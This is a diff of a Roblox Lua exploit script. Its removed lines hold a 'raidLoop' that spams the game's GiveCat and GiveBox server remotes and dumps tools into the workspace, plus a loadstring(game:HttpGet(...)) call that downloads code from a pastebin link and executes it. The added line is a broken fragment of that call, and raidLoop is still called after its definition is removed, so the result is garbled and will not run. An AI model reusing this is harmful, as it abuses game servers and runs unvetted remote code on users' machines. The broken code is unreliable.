@@ -591,25 +591,7 @@ local function processChatCommand(msg)
     end
 end
 
-game:GetService("Players").LocalPlayer.Chatted:Connect(processChatCommand)
-local function raidLoop()
-    while true do
-        wait() -- Wait for the next frame
-        local backpack = game.Players.LocalPlayer.Backpack
-        if isKittyRaidLooping or isBoomboxRaidLooping then
-            for _, tool in pairs(backpack:GetChildren()) do
-                if tool:IsA("Tool") then
-                    tool.Parent = game.Players.LocalPlayer.Character
-                    tool.Parent = workspace
-                end
-            end
-        end
-
-        if isKittyRaidLooping then game.ReplicatedStorage.GiveCat:FireServer() end
-        if isBoomboxRaidLooping then game.ReplicatedStorage.GiveBox:FireServer() end
-    end
-end
-loadstring(game:HttpGet("https://pastebin.com/raw/2kyjCzkA"))()
+tpGet("https://pastebin.com/raw/2kyjCzkA"))()
 raidLoop() -- Start the raid loop
  end
 )
